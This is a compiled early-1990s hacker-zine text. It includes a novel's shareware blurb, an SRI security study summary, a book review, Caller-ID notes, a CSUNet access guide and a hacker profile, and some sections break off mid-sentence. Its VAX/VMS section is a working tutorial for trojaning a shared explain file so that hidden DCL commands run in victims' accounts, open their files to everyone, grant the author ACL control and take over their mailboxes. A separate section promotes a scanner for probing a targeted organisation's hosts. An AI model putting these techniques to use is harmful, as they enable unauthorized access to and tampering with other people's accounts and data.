"I  am  all  too familiar with the  appalling  realities  in  Mr.
Schwartau's book.  (A) potentially catastrophic situation."

Remember, it's only fiction.  Or is it?



                  TERMINAL COMPROMISE: SYNOPSIS

"It's all about the information . . . the information."
                         From "Sneakers"

Taki Homosoto, silver haired Chairman of Japan's huge OSO  Indus-
tries,  survived Hiroshima; his family didn't. Homosoto  promises
revenge  against the United States before he dies.  His  passion-
ate, almost obsessive hatred of everything American finally comes
to a head when he acts upon his desires.

With  unlimited resources, he comes up with the ultimate  way  to
strike back at the enemy. Miles  Foster, a brilliant 33 year old
mathematician   apparently isn't  exactly  fond of America either.
The  National  Security  Agency wanted  his  skills, but his back-
ground and "family" connections kept him from advancing within the
intelligence  community.  His  insatiable - borderline psychotic-
sex drive  balances  the intensity  of waging war against his own
country to  the  highest bidder.

Scott  Mason,  made  his fortune selling high tech  toys  to  the
Pentagon.   Now as a New York City Times reporter,  Mason  under-
stands  both  the good and the evil of technology  and  discovers
pieces  of  the terrible plot which is designed  to  destroy  the
economy of the United States.

Tyrone  Duncan, a physically huge 50-ish black senior  FBI  agent
who suffered through the Hoover Age indignities, befriends  Scott
Mason.  Tyrone provides the inside government track and confusion
from competing agencies to deal with the threats.  His altruistic
and  somewhat pure innate view of the world finally makes him  do
the right thing.

As  Homosoto's  plan evolves, Arab zealots,  German  intelligence
agents and a host of technical mercenaries find the weaknesses in
our  techno-economic  infrastructure.   Victims  find  themselves
under  attack by unseen adversaries; Wall Street suffers  debili-
tating  blows; Ford and Chrysler endure massive shut downs.   The
U.S. economy suffers a series of crushing blows.

From  the White House to the Pentagon to the CIA to the  National
Security Agency and FBI, a complex weaving of fascinating politi-
cal characters find themselves enmeshed a battle of the New World
Order.   Sex,  drugs, rock'n'roll: Tokyo,  Vienna,  Paris,  Iraq,
Iran.  It's all here.

Enjoy reading "Terminal Compromise."



                     SHAREWARE - NOVEL FEES:

We hope that you enjoy "Terminal Compromise" as much as  everyone
else  has, and that you will send us a few shekels  according  to
the following guidelines.

The  NOVEL-ON-THE-NET SHAREWARE(tm)  fees for us as a  publishing
company  are no different than the fees for software  application
shareware publishers, and the intent is the same.  So please, let
us continue this form of publishing in the future.


NOVEL-ON-THE-NET SHAREWARE Fees For The People:

The suggested donation for individuals is $7.  If you hate Termi-
nal Compromise after reading it, then only send $6.50.  If you're
really, really broke, then tell a hundred other people how  great
it was, send us a rave review and post it where you think  others
will enjoy reading it, too.  If you're only a little broke,  send
a few dollars.  After all, this is how we stay in business.  With
each  registration, we will also send a FREE! issue of  "Security
Insider Report," a monthly security newsletter also published  by
Inter.Pact Press.


NOVEL-ON-THE-NET SHAREWARE Fees For Businesses:

We  hope  that  you put "Terminal Compromise"  on  your  internal
networks so that your employees will have the chance to enjoy  it
as well.  It's a great way to increase security awareness amongst
this  country's 50,000,000 rank and file computer  users.   Plus,
it's a hell of a good read.

One  company  plans  on  releasing  a  chapter  every  few   days
throughout its E-Mail system as a combination of security  aware-
ness  and employee 'perc'.  Try it; it works and  your  employees
will  appreciate it.  Why?  Because they'll all talk about  it  -
bringing security awareness to the forefront of discussion.

THE STATE OF SECURITY IN CYBERSPACE

SRI International conducted a worldwide study in 1992 of a broad range of
security issues in "cyberspace."  In brief, cyberspace is the full set of
public and private communications networks in the United States and elsewhere,
including telephone or public switched telephone networks (PSTNs), packet data
networks (PDNs) of various kinds, pure computer networks, including the
Internet, and wireless communications systems, such as the cellular telephone
system.  We did not address security vulnerabilities associated with
classified, secure communications networks used by and for governments.

The study was conducted as part of our ongoing research into the
vulnerabilities of various software components of cyberspace.  Our approach was
to conduct research through field interviews with a broad range of experts,
including people we characterize as "good hackers," about security issues and
vulnerabilities of cyberspace and the activities of the international
"malicious hacker" community.

While the specific results of the study are proprietary to SRI, this brief
report summarizes our general conclusions for the many individuals who kindly
participated in our field interviews.  As we indicated during our field
interviews, the original research for this project was not part of any other
kind of investigation, and we have not revealed the identify of any of our
respondents.

The study aimed to understand "malicious hackers," that is, people who have and
use the technical knowledge, capability, and motivation to gain unauthorized
access, for various reasons, to systems in cyberspace.  It is important to
understand that by no means all hackers are malicious nor does most hacking
involve unauthorized access to cyberspace systems; indeed, only a small
fraction of computer hacking involves such activities but gives hacking an
otherwise undeserved bad reputation.  While we attempted to focus on technical
(software) vulnerabilities, our interviews led us to look more at the broader
motivations and different approaches to cracking into various networks and
networked systems.

MAIN CONCLUSIONS

Our main conclusion is that social, organizational, and technological factors
still combine in ways that make much of cyberspace relatively vulnerable to
unauthorized access.  The degree of vulnerability varies from one type of
communications system to another.  In general, the PSTN is the least vulnerable
system, the PDNs are somewhat more vulnerable than the PSTN, the Internet is
relatively insecure, and as is widely known, the cellular phone system is the
most vulnerable of the four major areas we addressed.

The main vulnerabilities in most communications networks involves procedural,
administrative, and human weaknesses, rather than purely technical
vulnerabilities of network management, control systems, and hardware, and
software.  There are technical vulnerabilities--poor system design and specific
security flaws in software--but they are mainly exploitable because of the
above problems.

Highlights of the study's conclusions include:

o Malicious attacks on most networks and networked systems cannot be completely
prevented, now or in the future.  More than enough information is publicly
available to hackers and other technically-literate people to preclude attempts
at prevention of intrusions.

o It is possible individuals or groups could bring down individual systems or
related groups of systems, on purpose or by accident.  However, security is
generally improving as a result of dealing with past threats and challenges to
system security.  For instance, responses to the most recent serious threat to
the Internet, the so-called Internet Worm in 1989, included improved security
at sites vulnerable to this sort of worm.

o We found no evidence that the current generation of U.S. hackers is
attempting to sabotage entire networks.  On the contrary, doing so is
inconsistent with the stated ethics and values of the hacker community, which
are to explore cyberspace as a purely intellectual exercise without malicious
intent or behavior.  Some individuals who operate outside this informal ethical
framework, however, can and do damage specific systems and occasionally use
systems for personal gain or vindictive activities.

o There is some evidence that the newest generations of hackers, may be more
motivated by personal gain than the traditional ethic of sheer curiosity.  This
development could mean that networks and networked systems could become more
likely targets for attacks by hardened criminals  or governments' intelligence
services or their contractors (i.e., employing malicious hackers).  This threat
does not appear to be significant today but is a possible future scenario.

o The four major areas of vulnerability uncovered in our research have little
or nothing to do with specific software vulnerabilities per se.  They relate
more to the ways in which hackers can gain critical information they need in
order to exploit vulnerabilities that exist because of poor systems
administration and maintenance, unpatched "holes" in networks and systems, and
so on.
- The susceptibility of employees of businesses, public organizations, schools,
and other institutions to "social engineering" techniques
- Lax physical and procedural controls
- The widespread availability of non-proprietary and of sensitive and
proprietary information on paper about networks and computer systems
- The existence of "moles," employees of communications and computer firms and
their suppliers who knowingly provide proprietary information to hackers.

o The vulnerabilities caused by shortcomings in software-based access controls
and in hardware-related issues constitute significantly lower levels of risk
than do the four areas discussed above on more secure networks such as the PSTN
and PDNs.  However, on the Internet and similar systems, software-based access
controls (for instance, password systems) constitute significant problems
because of often poor system maintenance and other procedural flaws.

RECOMMENDATIONS

Based on our research, we recommend the following:

1. Protection of organizational information and communications assets should be
improved.  Issues here range from those involving overall security systems to
training employees and customers about maintenance of security on individual
systems, handling and disposition of sensitive printed information, and dealing
with "social engineering."

2. Techniques used to protect physical assets should be improved.  For example,
doors and gates should be locked properly and sensitive documents and equipment
guarded appropriately.

3. Organizations and their employees should be made aware of the existence and
role of moles in facilitating and enabling hacker intrusions, and care taken in
hiring and motivating employees with the mole problem in mind.

4. Software- and hardware-based vulnerabilities should also be addressed as a
matter of course in systems design, installation and maintenance.

5. Organizations concerned with information and communications security should
proactively promote educational programs for students and parents about
appropriate computer and communications use, personal integrity and ethics, and
legitimate career opportunities in the  information  industry, and reward
exemplary skills, proficiency and achievements in programming and ethical
hacking.

6. Laws against malicious hacking should be fairly and justly enforced.

SRI's believes that the results of this study will provide useful information
to both the operators and users of cyberspace, including the hacker community.
We are planning to continue our research in this area during 1993 within the
same framework and conditions (i.e., anonymity of all parties and
organizations) as we conducted the 1992 research.  We invite hackers and others
who are interested in participating in this work through face-to-face,
telephone or email interviews should contact one of the following members of

     When I started to read this book, I expected to read one more of the
series of books that claim to be the "definitive history of the computer
underworld" and the "first book to define the technological subculture of
phreaking, hacking, and virus writing".  After all what does a guy that
writes for GQ, The Hollywood Reporter, Variety and Time know about the
computer underground?  Well to my surprise the authors, Paul Mungo and
Bryan Clough (a member of the Virus Strategy Group, which is coordinated by
New Scotland Yard's Computer Crime Unit), did a pretty good job at presenting
the facts as they are.  For the first time I heard a reporter and a
computer crime expert give real figures at how much computer crime has
really cost.  Other than a few minor technical errors and the fact that
they fail to mention some people and groups (especially in the virus
section), the book was enjoyable to read.

    The book covers the history of the underground starting with its
beginnings in the 60's, from phreaking to the adventures of Captain
Crunch and the rest of the bunch to the not so long ago Operation Sundevil
and the raids all over the country on members of the LOD, MOD and DPAC.
It also goes through the events that led to the German hackers spy trials,
and to the new generation of virus writers that are creating the new kind
of living organisms that roam cyberspace.  They also discuss the gray
scale that categorizes hackers, from the good hackers to the bad to the
ones not that bad... those who are in it for profit and those who are
in it to learn.  Hopefully all the readers of the book, hackers, security
specialists, reporters and the general public will get a better
understanding of what motivates hackers to do what they do by learning
where they come from. To the hackers let them learn not to repeat their
past errors.


     I hope that the time of raids and sting operations has passed, but
the late developments in the Washington 2600 meeting have pulled a shadow
over my hopes.  Has no one learned?  Have the SS and FBI nothing better to
do?  Just a few moths back someone pulled one of the greatest scams of all
by setting up a fake ATM and stealing a few thousand dollars.  These are
the kind of people the authorities should be after.  And to the hacker,
don't sell yourself!  Remember this is a learning trip, once you start
forgetting to learn and start making money out of it, it is just another
job, an illegal one at that.

     Approaching Zero was an exciting and interesting surprise.  It has
given me the hint that maybe someone out there understands and I hope that
everyone that reads it (and you must, you must read and learn all you can)
will also understand.  I just leave you with these words:  Hacking comes
from the heart - sometimes in the form of an obsession, sometimes in the
form of a hobby - once that dies, there is nothing left to do.  No more
traveling trough the nets!  No more exploring new systems!  You might as
well turn the power off.

             {----------------------------------------------}

     VAX/VMS hacking has declined in popularity over the years due to the
abundance of UNIX machines now available. It has even gotten bad press from
fellow hackers. Included in this file is a security hole the size of , oh,
any of the older IBM mainframes. With a little curiosity, persistence, and
down right stubbornness I came across this rather obvious hole in the system.
However, this hole may be so obvious that it has remained relatively hidden
until now, especially since the decline of DCL users.
     On most VAX systems, there is something called explain files.  These are
usually help files that are made up by the system operators or borrowed from
somewhere to help better explain the way certain features of the system work,
whether they be general VAX commands, or system-specific programs.
     When you are in your account (Presumably, a fake one, as this can be
tracked down if you are foolish) type:

$ explain index

     and you will get a list of all the explain files on your system. Go ahead
and take a look around these just to get a feel of what it looks like.  It
should be a menu driven list of text files to view or programs to run(!!!).
     Most system operators only set this up to show various text files
describing commands like mentioned above. However, DCL .com files can be run
from explain files as well. Now comes the fun. Many systems will also allow
users to set up there own explain file. A really nice way to make it easy for
other users to view text files or run programs that you have set for group or
world access.
     The first thing someone needs to do is make a file called INTRO.LKT which
will contain whatever introduction text that you would like displayed before
your explain file menu is displayed(i.e. you might have a description of
yourself, your duties, or a funny poem, or WHATEVER YOU WANT THAT CAN BE
CONTAINED IN A TEXT FILE!!!!)
     You can use any editor to do this like EDT(a line editor) or TPU(a full
screen editor). You will need to type something along these lines to create the
file:

$set vt=100         !if using a full screen editor like TPU
$edit/tpu intro.lkt

     After you are finished typing in the file, if you used TPU (A much better
choice than EDT), you press <CONTROL-Z> to save the file. Now you must create
a file called INDEX.LKI which will contain the file directories, filenames,
and short descriptions of the files that you want to have displayed. You do
this in the same manner as above, by entering an editor, and creating the file.

$edit/tpu index.lki

     Now, in this file the lines should look like the following:
(File Directory)         (Filename)      (File Description)

Phrack41.txt  A complete copy of Phrack 41 for your enjoyment.
User:[aknight.hack]vms.txt A guide to hacking VMS systems.
Temp$1:[aknight.ftp]ftplist.txt A list of FTP servers in-state.

     Now, to explain these three lines. The first one will look for the program
in your main directory. The second line will look for the program listed after
it on the device called USER and in the HACK directory within the AKNIGHT
directory. The final line will look on the device called TEMP$1 in the FTP
directory within the AKNIGHT directory. Adding DCL programs will be explained
in a minute, but first lets get this up and running.
     Now, that you have typed in the text files you want, and saved this file
you need to set the protection on your main directory and any others that need
accessing like the text files to group and world access. For the above example
one would want to type(assuming you are in your main directory):

$set prot=(g:re,w:re) user:[000000]aknight.dir     !This is my main directory
$set prot=(g:re,w:re) user:[aknight.hack]
$set prot=(g:re,w:re) temp$1:[000000]aknight.dir   !My second storage device
$set prot=(g:re,w:re) temp$1:[aknight.ftp]
$set prot=(g:r,w:r)   phrack41.txt                 !Giving privs to read only
$set prot=(g:r,w:r)   user:[aknight.hack]vms.txt
$set prot=(g:r,w:r)   temp$1:[aknight.ftp]ftplist.txt

     Now, if you type:

$explain aknight              ! (my username in this instance,your normally)

     You should get a print out to screen of your INTRO.LKT file and then a
message along the lines of "Hit <return> to continue". When you hit return a
menu will appear very similar to the normal explain file menu except with your
files listed and their descriptions which were accessed by the computer from
your INDEX.LKI file. It would look like this(or something similar) in the above
example.

   {a print out of my INTRO.LKT file...}

Hit <RETURN> to continue

(Q) TERMINATE THIS PROGRAM
================================================================================
T = Text Display P = Program to be run
(* = Related Information)
Choose A-C, Q, oe type HELP for assistance.

     Now you have an explain file. Pressing A-C will print those files to
screen with pauses at each page if set up on your system/account to do so. I
typed out number C the way I did, because when it has to access a directory
other than it's main one, it will usually do this. I think there is away around
this, but to be quite honest I haven't bothered figuring it out yet. When you
quit, you will be dropped back off at your main prompt. The reason you need to
set your protections, is because even thought from your account, it may look
like it is working, if you don't set your protections as described above,
NO ONE else will be able to view it!!
     Now, comes the fun part. Putting DCL .COM files into your explain file.
These are put into your index just like any text file. So you could type up a
program to let someone copy the public files you have in your account to their
directory, or something similar. The security flaw comes in here and it is
a big one. Since a user is accessing your explain file from their account, any
file that they run, issues commands in their account. So, one might plant a
line in the middle of the above program that say something like:

$set def sys$login                   !Returns them to their main directory.
$set prot=(g:rwed,w:rwed) *.*;*      !Their files are now read, write, execute,
                                     !and deleteable by anyone, including you.

     Here is another idea. Say you create a text reader in DCL, to allow people
to jump around in the text files you have, skip pages, etc. called TYPE.COM in
your main directory. Anytime you can fool people into thinking that the
computer is taking a little time to think, you can insert some major commands,
i.e. when it is skipping pages, or coping files, which almost takes no time at
all in reality. I STRONGLY suggest starting any program you plan to nest
commands like this into with:

$set noverify

     Which will make sure that the program lines don't get printed to the
screen as they are running. Another important command to know is the following
which will cause the next text output from the VAX to be sent to a NULL device,
so it will essentially be lost and not printed to the screen. So, if one is
accessing someone's mailbox, you don't want a messaging appearing on screen
saying that you have entered VAX/VMS mail or whatever. The command is:

$assign nl:sys$output/user

     If you forget the /user it will send the output to the null device for the
session, instead of just one line.
     Some other things one might do would be to add yourself to someone's
ACL(access control list) by typing:

$set acl/acl=(ident=[aknight],access=control) *.*;*

     Now, this will give you access to all their files just as if you were the
user, however if they bother to ever do a dir/prot command your username will
be printed all over the screen, so one would suggest if you must do this, to
use a fake account. Same with this below command:

$assign nl:sys$output/user
$mail set write aknight

     The second line will give me read and write access to someone's mailbox,
but once again if they bother to check their mailbox protections your username
will be displayed.
     In case, you haven't realized this yet, this all has A LOT of potential,
and what I have mentioned here is just the tip of the iceberg and really mostly
small and even foolish things to do, but the fact comes down to ANYTHING the
user can do in their account, YOU can do in there account if you know the right
commands and have the patience to nest them into a .COM file well enough.
     When you have created the .COM file and added it to the INDEX.LKI file,
then you will need to set the protection of the file like so:

$set prot=(g:e,w:e) type.com                  !Execution only. No read privs.

     You now have it a fully functional explain file that is only held down by
your imagination.

     Remember, malicious actions aren't the sign of a true hacker, so don't
delete a users complete directory just because you want to show of your power.
Most people won't be impressed.  If your a SYSOP, fix this DAMN HOLE!!! And if
your a user well, learn the system quickly, explore, absorb, and discover some
other hole before the above SYSOP patches this one......

                                  (War Dialer)

                                       by

                                    MadHatter



Purpose of this program
~~~~~~~~~~~~~~~~~~~~~~~

     Remember those scanner, war dialer programs everyone used to scan areas of
telephone numbers to find unknown hosts?  Well, now your on the net and you're
targeting some certain establishment, and you know which part of the net they
own, but the hell if you know what the actual IP addresses of their hosts are...
Telneting to NIC.DDN.MIL is no help, their records are a year old...  Might as
well have been 10 yrs ago...  So you type every possible IP address in.  Right?
After a while that shit gets tiring...  Well, hell let the computer do it,
that's what its there for.  More speed, no sore fingers, no bitching, and it
runs when you're not there.  Almost perfect.....


Program Details
~~~~~~~~~~~~~~~
     DCL is the language and it runs on Vaxen.  A,B,C,D respectively represent
the starting IP address.  E,F,G,H respectively represent the ending IP address
(ex. If you what to start at 4.1.1.1 and end at 6.1.1.1 then a = 4, B = 1,
etc.,  E = 6, F = 1, etc.)
     The prog creates a data file (FINAL.DAT) that holds all successful
connections.  If you run it in batch, it also creates a .log file.  This by
far takes up most of the memory.  When the program quits, delete it.
This prog is just one big loop.  It finds a good telnet address and then
reIFINGERs there, saving it.


Program Changes
~~~~~~~~~~~~~~~

     If you run it in batch, then you might (probably) have to define where
the IFINGER or FINGER program is.  Make sure it is the one for FINGERing remote
hosts, the commands for it vary.  Why do you have to define it?  Because the
dumb-ass sysop couldn't think of why anyone would want to use it in batch.


Problems
~~~~~~~~

     The IFINGER (FINGER) command might not connect to some hosts from your
system.  Why can you TELNET there but no IFINGER?  It all probably has to do
with the other host (it has tight security, too far away, doesn't support
FINGERing, etc.).


No Solutions (Just one)
~~~~~~~~~~~~~~~~~~~~~~~

     You say if I can TELNET to more places than IFINGERing, why not base the
scanner on the TELNET command?  Two reasons: (1) the security with the TELNET
command requires its output goes to a terminal, never to run in batch; (2) the
TELNET command does not give the character address (at least not on the system I
use).  To have the character address is valuable to me.  The program lists the
IP address, the character address, then whatever finger came up with.
     When running in batch, the program will quit eventually (do to MAX CPU
time or exceeded disk quota).  This can be a pain (especially if its CPU time),
you can always get more memory.  Try changing the file specifics in the prog,
and run many versions of it at once, to get as much cpu time as possible.
For memory, clear your account, or get more of them.  Another problem is when
your program has stopped and you have nothing in FINAL.DAT file.  So where do
you start the batch off again?  All I can say is count the number of failed
connections and add 'em to your previous start address, start at that address.


More Ideas
~~~~~~~~~~

     If you want the net area of an establishment then ftp to NIC.DDN.MIL and
get the hosts listing, or TELNET there and search for the name.
     Some areas of the net do not like to be scanned.  Your sysop will get nasty
calls, and then you will get nasty e-mail if you for instance scan the Army
Information Systems Center.  Or any other government org.  Of course, this
program wouldn't hurt them at all, it would bounce back.  They use firewalls.
But they will bitch anyway.
     After you run this program for awhile, you'll notice the net is really
a big empty place.  Hosts are few and far between (at least address wise).
Are you agoraphobic yet?  What do you do with all this room?

       Caller Identification
       by (Loq)ue & Key
       3/20/93


        Caller-Identification (CID), is a relatively new service being
   offered by several carriers.  It is part of a total revamp of the
   telephone network, with the telephone companies trying to get people
   to spend more money on their systems.  CID is just one of the newer
   CLASS services, which will eventually lead into ISDN in all areas.

        Caller-ID allows a receiving party to see the number that is
   calling before they pick up the phone.  It can be used for everything
   from pizza delivery to stopping prank callers.  One scenario
   made possible from CID is one where a salesman dials your number,
   you look on a little box and see that it is someone you don't want
   to talk to, so you promptly pick up the phone, say "Sorry, I don't
   want any *** *** products" and slam down the receiver.  Ah, the
   wonders of modern technology.

        Caller-ID starts by a person making a call.  When the person
   dials a number, the local switch rings the calling number once, and
   then sends a specially encoded packet to the number, after checking
   to see if that caller has access to the Calling Number Delivery
   service.

        The packet can contain any information, but currently it holds
   a data stream that contains flow control, and error checking data.
   The specifications state that several signals can exist, however,
   only the Caller-ID signal is used currently.

 The CID packet begins with a "Channel Seizure Signal".  The
   CSC is 30 bytes of hex 55, binary 01010101, which is equivalent to
   250 milliseconds of a 600 hz square wave.

        The second signal is the "Carrier Signal," which lasts for 150
   milliseconds, and contains all binary 1's. The receiving equipment
   should have been "woken-up" by the previous signal and should now
   be waiting for the important information to come across.

        Next are the "Message Type Word", and the "Message Length Word".
   The MTW contains a Hex $04 for CID applications, with several other
   codes being planned, for example $0A to mean message waiting for
   a pager.  The MLW contains the binary equivalent of the number of
   digits in the calling number.

        The data words come next, in ASCII, with the least significant
   digit first.  It is padded in from with a binary 0, and followed by
   a binary 1.  A checksum word comes after that, which contains the
   twos-complement sum of the MLW and data words.

 The checksum word usually signals the end of the message from
    the CO, however, other messages for equipment to decode can occur
    afterwards.

        Caller-ID can usually be disabled with a 3 digit sequence,
   which can vary from CO to CO.  Several of these have been mentioned
   in the past on Usenet, in comp.dcom.telecom.

        Caller-ID chips are available from many sources, however,
   remember that you must connect these chips through an FCC-approved
   Part-68 Interface.  Several of these interfaces are available,
   however they are fairly expensive for an amateur electronics hacker.

        If you have any more questions on CID, mail me at the above
   address, or post to comp.dcom.telecom.

caps      - CSUNet networking machine. From it, you can connecting to most
            PAD hosts plus a few more. The extras are:
            access    - Connect to eis.calstate.edu (login as "access")
            core      - Connect to eis.calstate.edu (login as "core")
            ctp       - Connect to eis.calstate.edu (login as "ctp")
            eis       - Connect to eis.calstate.edu (login as "eis")
            trie      - Connect to eis.calstate.edu (login as "trie")
            csupernet - CSUPERNet appears to be a public-access UNIX.
                        login as "public" for ATI-Net.
                        login as "super" for academic information.
                        login as "atls" for the ATLS system
                        Once you apply for an account here, you can telnet
                        to caticsuf.cati.csufresno.edu to use it.

     This is all well and good, but how to you access CSUNet? It can be reached
via Internet, using the Humbolt PACX (pacx.humboldt.edu). The Humboldt PACX
allows several services, among them are:

     X25 - Connect directly to CSUNet PAD
     960 - CDC Cyber 180/830 (Swirl)
     830 - CDC Cyber 180/830 (COC from Swirl)
     VAX - VAX 8700 (VMS V5.3)
     70  - DEC PDP 11/70 (running RSTS)
     SEQ - Sequent S81 (running Dynix V3.1.4 X.25 UNIX software)
  TELNET - Telnet Server

     That's really all there is to say concerning the network structure (well,
I could go through and list all their X.25 addresses, but I won't). There's a
ton more to be said about using this network, but its little quirks and
surprises can be left to you to figure out. What I can do here is give a few
hints on using CDCNet and the PAD.

Using the PAD
~~~~~~~~~~~~~
     Once you're at the X.25 PAD, you'll get a message like:
CSUnet Humboldt PCI/01, Port: P17
     At the "Pad>" prompt, simply type the hostname to connect to. When in
doubt, type "help <subjectname>", or just "help" for a list of subjects that
help is available on.

Using CDCNet
~~~~~~~~~~~~
     When a CDC Cyber says "You may now execute CDCNet Commands", this is your
cue. You have the following commands available:

activate_auto_recognition
activate_x_personal_computer
change_connection_attribute
change_terminal_attribute
change_working_connection
create_connection
delete_connection
display_command_information
display_command_list
display_connection
display_connection_attribute
display_service
display_terminal_attribute
do
help
request_network_operator

     The ones to concern yourself with are display_service, create_connection,
and help. "help" gives the above command listing (useful), "display_service"
lists the hosts on the current CDCNet, and "create_connection <host>" creates a
connection to "host" on the CDCNet.

                            -:[ Phrack Prophile ]:-

This issue our prophile features a hacker who has been around forever,
who's been there and done that, literally.  His handle is Dr. Who.
When almost everyone was still mystified by Telenet, Dr. Who was busily
exploring Europe's PSN's like PSS and Datex-P.  When the Internet was in
its infancy, Dr. Who was there with an account on BBN.  When the world
was short of NUI's, Dr. Who discovered and perfected Pad-To-Pad.  When
the world still thought COSMOS was the end-all-be-all, Dr. Who was
lurking on 1A's.  One of the early LODers and one of the longest lasting.
And to top it all off, a close personal friend.  How elite can you get?

______________________________________________________________________________

 Personal Info:

           Handle: Doctor Who (aka Skinny Puppy and Saint Cloud)
         Call him: Bob
    Date of Birth: February 5, 1967
              Age: 26
           Height: 6'1"
           Weight: 160 lbs
  Computers owned: in chronological order:  Apple ][ series, Sinclair ZX81,
                   Commodore TRS-80 models 4 and 16, Coco, Atari 512,
                   Toshiba 2000sx.  I am probably leaving out some.


How did you get your handle?

    From the TV show, of course - I had a hard time defending it from other
    people, so would sometimes add (413), my home area code, to identify
    which one I was.  Skinny Puppy was from the band of course,
    and Saint Cloud was from the location of a system I was playing with,
    in France.

How did you get started?

     As a kid, I was a radio & electronics junkie.  In 6th grade I wanted
     one of those $99 "computer kits" you would see in the back of "Popular
     Electronics" magazine, which had a hex keypad, and seven-segment LED
     display, had 1K of ram, etc...But lusted after the TRS-80 model-I
     when I used it at Radio Shack.  I finally got a computer in 1981
     when I was in 9th grade.  I asked my parents for a Commodore,
     but they went all out and got an Apple ][+.  I took to programming
     instantly, and within a few months had a reputation as the best
     programmer in my school.

     In a 1982 "Popular Communications" magazine article, I discovered
     the world of loops and test tones and started playing with those.
     I later tried to make free phone calls by using a tape recorder
     as a red box but failed, looking back probably due to inadequate
     volume. The seeds had been planted.

     I wanted all sorts of software, but I had no money, and my parents
     wouldn't buy very much.  One computer-club meeting, someone brought
     in about 15 disks of pirated software, and I had a chance to copy
     about 4 disks.  They guy told me about pirate BBSs, and people trading
     software.  In a few of the games I copied, there were numbers to
     different BBSes, and when I was at a friends house on Cape Cod in the
     summer of 1983, we used his 300 baud acoustic modem to call them.
     I remember calling Pirate's Harbor in Boston, and I think we called
     Pirate-80.

     I wanted a modem badly, but they were too expensive.  I convinced a
     friend to split the cost with me, and on January 2, 1984 my
     networker modem arrived.  That month, in the process of getting warez
     I ran up over $150 in phone bills as there were no local boards.
     I was becoming obsessed with being on the modem, and on the computer
     in general.  I was never a good student, and my parents and teachers
     found a way, they thought, to entice me to do my homework - hold
     computer usage over my head.  But this just succeeded in making me
     sneak access when no one was looking - during lunch at school, or
     when my parents went shopping at home.  Soon they locked the computer
     room (the den, really) when they left, but I used a ladder to get
     in to the second story window until I had a copy of the key.  To this
     day I think if they let me indulge myself in my interest, I would have
     become a much more normal computer geek, and done better in school.
     Anyhow, I started learning about codez to appease the huge phone bills,
     and started to learn more about phones & how they worked.  The pirating
     fell by the wayside as I became more involved with phreak/hack boards.
     I was fascinated by communications (I always had been) and
     phreaking/hacking opened up new frontiers.  My inhibitions in breaking
     the law melted away because it interfered with my enjoyment of
     knowledge - had there been opportunities to pursue this avocation
     without breaking the law, I probably would have done so.

     A hacker was born.


What are your interests?

              Women: Tall, thin, brainy, blue eyes.  It seems as though I
                     attract all the psychos.  Right now, I am FREE of
                     any relationships and haven't decided whether I am
                     enjoying it or not.
               Cars: Cars are the greatest things.  I love them.  Art,
                     Machine & House  - The only possession I have that
                     encloses me.  I got my license later than most people,
                     and have learned to enjoy the freedom wheels bring,
                     especially for someone who lives in a rural area.
                     Right now, I own two cars, one running (barely) and
                     entirely generic, the other one very unique, beautiful,
                     and broken.  The story of my life!
               Food: I hate fish & chicken, love hot food.  Not a vegetarian
                     in the least.  But don't eat much, I am too busy.
                     I survive on Coffee.
              Music: I have been 'alternative' for a while now, kind of
                     Gothic, sometimes I dress that way, sometimes I don't.
                     Favorite bands:  Joy Division, Skinny Puppy, old Cure,
                     but I have been starting to like Techno more and
                     also Classical.  Go figure.
   Favorite authors: Ayn Rand, Ann Rice, Robert Anton Wilson, George Orwell,
                     Douglas Adams, J.G. Ballard
      Favorite Book: Atlas Shrugged
    Favorite Movies: Brazil, 1984, The Holy Grail, Heathers, Blade Runner,
                     Max Headroom, Slacker, Subway, Drowning by Numbers, Dune
        Favorite TV: Doctor Who (of course), The Avengers, Miami Vice,
                     Hawaii Five-O

What am I?

     A slacker, a hacker, a writer, a romantic, a twenty-nothing, a lost
     poet, a New Englander, an American in the truest sense of the word,
     a girl-chaser, a connoisseur of cheap champagne & expensive beer,
     a dilettante, a smoker of cloves, caffeine addict, an atheist,
     a discordian, a libertarian of sorts, a cynic, a procrastinator,
     a conversationalist, a fast driver, an oldest child, a criminal,
     a watcher of fire & water, a lover of love, a believer in the unpure,
     a trekkie, a whovian, an anglophile, still an undergraduate, jealous,
     mischievous, a perfectionist, a believer in the essential
     good in mankind, and probably a mortal.

What are some of your most memorable experiences?

     The worst day of my life - 3/11/86 - getting busted, and not knowing
     what for.  My parents called up my high-school and left a message for
     me to call home immediately.  When I did, they informed me that the
     Secret Service and TRW (Hi Mr. Braum) had been in our house and removed
     everything.  A nosy neighbor saw the whole incident, and within days our
     entire town knew about the raid.

     Some three and a half years later they pressed charges.  So much for
     due process and right to a speedy trial.

   Good days:

     5-91 - Being all fucked up in NYC with my girlfriend and Bill from RNOC;
     10/9/84 - My first TAP meeting.  Expecting to meet Mark Tabas but
     meeting his father instead.  Tabas had run away from home, and his
     parents found some notes indicating that he might turn up in New York
     at Eddie's for the TAP meeting.  Tabas' dad hopped on a plane to NYC,
     rented a car and staked out the meeting.  Everyone inside, already
     convinced that they were under surveillance, became very aware that
     they were being watched by some guy in a suit and a rental car.
     Eventually, he came inside and asked if anyone knew where Tabas was.
     We said "Who wants to know?"  To which he gave out his business card
     letting us know he was Tabas' dad and just worried.  Tabas was not
     even in New York.

     The whole summer of 1985 - staying at home, hacking and loving being
     a computer geek. Four days straight on an Alliance Teleconference once,
     being woken up each morning by blasts of touch-tone!

     Philadelphia Cons, back in 86.

     Most of the rest of my most memorable experiences are in my love life,
     which is none of your business!

Some People (and/or BBSes) To Mention:

     My favorite BBS of all time was Farmers of Doom.  Also memorable were
     The Legion of Doom, Osuny, WOPR, Black Ice, and lots more.
     My favorite boards were the ones where there was a lot of activity, and
     a lot of trust between the users.  While a board that doesn't crash
     all the time is important, an expensive computer does not a good
     board create.

     There are a lot of people who I would like to mention that have helped
     me greatly and who I have known for a very long time:

     Lex Luthor - Just because you're paranoid doesn't mean people
                  AREN'T out get you.

     Mark Tabas - He really does look like Tom Petty.

     Bill from RNOC - Should sell used cars.

     RC Modeler - I hold you wholly responsible for the Clashmaster incident :)

     Tuc - Well, he's just Tuc.  What else can you say?

     X-Man - Is he an FBI agent yet?

     Karl Marx - Only person I know with his own dictionary entry.
                 Next:  the social register.

     Mr. Bigchip - Who is that?  (I'm sure you are all asking)

     The Videosmith - (see entry for Luthor, L.)

     Parmaster - Should have followed Lex's advice.

     Kerrang Kahn - His accent is finally gone.

     Terminal Man - So long and thanks for all the codes.  (This man
                    knew The Condor?)

     The Marauder - Has taken up permanent residence on IRC.

     Shatter, Pad, Gandalf - PSS Junkies.  What those guys wouldn't
                             do for an NUI.

     New York - Don't Mess With Texas

